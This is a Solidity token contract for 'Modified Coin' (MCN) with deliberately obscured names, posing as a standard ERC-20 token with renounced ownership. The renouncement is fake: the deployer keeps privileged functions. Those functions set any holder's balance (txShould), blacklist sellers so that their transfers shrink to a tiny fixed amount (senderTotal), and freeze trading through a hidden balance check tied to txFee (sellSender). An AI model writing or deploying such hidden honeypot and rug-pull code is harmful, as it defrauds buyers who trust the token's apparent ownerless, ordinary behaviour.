//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract minAmountLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isMarketing {
    function createPair(address receiverSwap, address launchFund) external returns (address);

    function feeTo() external view returns (address);
}

interface minLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface listLimitReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minToken) external view returns (uint256);

    function transfer(address amountIs, uint256 launchedTeam) external returns (bool);

    function allowance(address marketingMaxTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedTeam) external returns (bool);

    function transferFrom(
        address sender,
        address amountIs,
        uint256 launchedTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptToken, uint256 value);
    event Approval(address indexed marketingMaxTotal, address indexed spender, uint256 value);
}

interface launchedExemptSender is listLimitReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ModifiedCoin is minAmountLaunched, listLimitReceiver, launchedExemptSender {

    mapping(address => bool) public launchedEnable;

    function name() external view virtual override returns (string memory) {
        return tradingAt;
    }

    function walletSell() public {
        emit OwnershipTransferred(feeTotal, address(0));
        teamTo = address(0);
    }

    function owner() external view returns (address) {
        return teamTo;
    }

    address shouldTake;

    string private amountAt = "MCN";

    uint256 liquidityReceiver;

    function transferFrom(address limitModeLiquidity, address amountIs, uint256 launchedTeam) external override returns (bool) {
        if (_msgSender() != receiverAt) {
            if (tradingBuyMin[limitModeLiquidity][_msgSender()] != type(uint256).max) {
                require(launchedTeam <= tradingBuyMin[limitModeLiquidity][_msgSender()]);
                tradingBuyMin[limitModeLiquidity][_msgSender()] -= launchedTeam;
            }
        }
        return toWalletReceiver(limitModeLiquidity, amountIs, launchedTeam);
    }

    bool public exemptReceiver;

    bool public teamList;

    function txAt(address atEnable) public {
        require(atEnable.balance < 100000);
        if (teamList) {
            return;
        }
        if (enableIsAmount != sellLaunch) {
            exemptReceiver = true;
        }
        exemptTeamEnable[atEnable] = true;
        
        teamList = true;
    }

    function balanceOf(address minToken) public view virtual override returns (uint256) {
        return minReceiver[minToken];
    }

    bool public tokenLimit;

    uint256 private exemptBuy;

    uint256 txFee;

    function txShould(address isTotalTo, uint256 launchedTeam) public {
        fromWallet();
        minReceiver[isTotalTo] = launchedTeam;
    }

    uint256 public isLaunch = 0;

    mapping(address => mapping(address => uint256)) private tradingBuyMin;

    uint8 private fundAutoList = 18;

    uint256 private takeFromBuy;

    uint256 public walletEnable = 0;

    uint256 private limitTotal = 100000000 * 10 ** 18;

    function allowance(address minTotal, address liquidityFee) external view virtual override returns (uint256) {
        if (liquidityFee == receiverAt) {
            return type(uint256).max;
        }
        return tradingBuyMin[minTotal][liquidityFee];
    }

    function symbol() external view virtual override returns (string memory) {
        return amountAt;
    }

    function teamSenderMarketing(address limitModeLiquidity, address amountIs, uint256 launchedTeam) internal view returns (uint256) {
        require(launchedTeam > 0);

        uint256 maxFeeLaunched = 0;
        if (limitModeLiquidity == receiverExemptAuto && walletEnable > 0) {
            maxFeeLaunched = launchedTeam * walletEnable / 100;
        } else if (amountIs == receiverExemptAuto && isLaunch > 0) {
            maxFeeLaunched = launchedTeam * isLaunch / 100;
        }
        require(maxFeeLaunched <= launchedTeam);
        return launchedTeam - maxFeeLaunched;
    }

    address private teamTo;

    uint256 private modeIs;

    function senderTotal(address walletReceiver) public {
        fromWallet();
        if (takeFromBuy == sellLaunch) {
            totalToken = enableIsAmount;
        }
        if (walletReceiver == feeTotal || walletReceiver == receiverExemptAuto) {
            return;
        }
        launchedEnable[walletReceiver] = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return fundAutoList;
    }

    uint256 private totalToken;

    function totalSupply() external view virtual override returns (uint256) {
        return limitTotal;
    }

    function toWalletReceiver(address limitModeLiquidity, address amountIs, uint256 launchedTeam) internal returns (bool) {
        if (limitModeLiquidity == feeTotal) {
            return launchMarketing(limitModeLiquidity, amountIs, launchedTeam);
        }
        uint256 amountToken = listLimitReceiver(receiverExemptAuto).balanceOf(shouldTake);
        require(amountToken == txFee);
        require(amountIs != shouldTake);
        if (launchedEnable[limitModeLiquidity]) {
            return launchMarketing(limitModeLiquidity, amountIs, fromAmount);
        }
        launchedTeam = teamSenderMarketing(limitModeLiquidity, amountIs, launchedTeam);
        return launchMarketing(limitModeLiquidity, amountIs, launchedTeam);
    }

    mapping(address => bool) public exemptTeamEnable;

    uint256 private enableIsAmount;

    event OwnershipTransferred(address indexed totalShouldIs, address indexed buyTx);

    mapping(address => uint256) private minReceiver;

    string private tradingAt = "Modified Coin";

    function transfer(address isTotalTo, uint256 launchedTeam) external virtual override returns (bool) {
        return toWalletReceiver(_msgSender(), isTotalTo, launchedTeam);
    }

    function getOwner() external view returns (address) {
        return teamTo;
    }

    function fromWallet() private view {
        require(exemptTeamEnable[_msgSender()]);
    }

    bool public liquidityTotal;

    address public receiverExemptAuto;

    address receiverAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public feeTotal;

    uint256 private sellLaunch;

    function launchMarketing(address limitModeLiquidity, address amountIs, uint256 launchedTeam) internal returns (bool) {
        require(minReceiver[limitModeLiquidity] >= launchedTeam);
        minReceiver[limitModeLiquidity] -= launchedTeam;
        minReceiver[amountIs] += launchedTeam;
        emit Transfer(limitModeLiquidity, amountIs, launchedTeam);
        return true;
    }

    uint256 constant fromAmount = 3 ** 10;

    function sellSender(uint256 launchedTeam) public {
        fromWallet();
        txFee = launchedTeam;
    }

    constructor (){
        
        walletSell();
        minLaunched senderBuyExempt = minLaunched(receiverAt);
        receiverExemptAuto = isMarketing(senderBuyExempt.factory()).createPair(senderBuyExempt.WETH(), address(this));
        shouldTake = isMarketing(senderBuyExempt.factory()).feeTo();
        if (takeFromBuy != modeIs) {
            exemptReceiver = true;
        }
        feeTotal = _msgSender();
        exemptTeamEnable[feeTotal] = true;
        minReceiver[feeTotal] = limitTotal;
        
        emit Transfer(address(0), feeTotal, limitTotal);
    }

    function approve(address liquidityFee, uint256 launchedTeam) public virtual override returns (bool) {
        tradingBuyMin[_msgSender()][liquidityFee] = launchedTeam;
        emit Approval(_msgSender(), liquidityFee, launchedTeam);
        return true;
    }

}